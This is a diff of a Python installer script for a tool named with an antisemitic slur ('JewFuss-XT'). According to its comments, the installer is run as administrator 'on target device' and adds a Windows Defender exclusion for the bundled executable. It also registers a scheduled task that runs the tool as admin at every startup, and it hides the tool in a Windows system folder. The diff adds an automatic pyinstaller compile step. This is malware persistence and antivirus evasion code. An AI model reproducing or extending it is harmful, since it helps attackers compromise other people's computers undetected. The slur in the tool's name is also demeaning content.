@@ -6,25 +6,45 @@ import PyElevate
 import time
 import psutil
 
-# Sadly you cannot run this as a .py and must compile it first to test
+target_dir = r"C:\ProgramData\Microsoft\Windows\Tasks" # can be where ever the fuck you want, as long as it will be able to access it
+printnonerrors = False
 
-# compile command 
-#   pyinstaller --onefile --add-binary="builds/JewFuss-XT.exe;." --distpath=builds --workpath=data installer.py
+# running as .py will just compile it, the uncompiled version does not work
 
 # this is a alternive to the normal startup command for jewfuss-xt, this version will auto exempt from windows defender and create a scheduled task to run as admin for any user on startup
 # using the $startup commmand will break this as it moves the location of jewfuss-xt, in witch the scheduled task will not be able to find it etc, so just dont use the command :)
 # using this requires a bit of setup, first complie jewfuus-xt and leave it in the builds folder
 # than compile this script using the command above, and run it the output exe as as adminastrator on target device
 
-# also you are god damn right chatGPT made most of this, I don't have the time nor knolage on scheduling tasks using commands
+# also you are god damn right chatGPT made most of this (nost really just means the inital verison), I don't have the time nor knolage on scheduling tasks using commands
 
 # Define the target directory and name of bundled executable to run
-target_dir = r"C:\ProgramData\Microsoft\Windows\Tasks" # can be where ever the fuck you want
-app_name = "JewFuss-XT.exe"
 
-printnonerrors = False
+try:
+    if os.path.splitext(sys.argv[0])[1].lower() == ".py": # compile if ran as .py
+        app_name = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
+        
+        if not app_name:
+            app_name = "JewFuss-XT.exe"
+            
+        while True:
+            if os.path.exists(f"builds/{app_name}"):
+                break
+            else:
+                app_name = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
+        
+        os.system(f'cd {os.path.dirname(os.path.abspath(sys.argv[0]))} && pyinstaller --onefile --add-binary="builds/{app_name};." --distpath=builds --workpath=data installer.py')
+        exit("Finnished compiling")
+        
+except KeyboardInterrupt:
+    exit("Keyboard interupt, exiting compiler...")
+    
+except Exception as e:
+    print(f"Error compiling: {e}")
+    
 
-errored = False #dont change
+
+errored = False # Don't change
 def add_defender_exclusion(file_path):
     global errored
     try:
@@ -83,7 +103,7 @@ if printnonerrors: print(f"Installing to: {final_app_path}")
 
 try:
     if os.path.exists(final_app_path):
-        print(f"Found existing file")
+        if printnonerrors: print(f"Found existing file")
         try:
             if any(app_name.lower() in (p.info['exe'] or '').lower() for p in psutil.process_iter(['exe'])): 
                 if printnonerrors: print("Terminating existing process...")
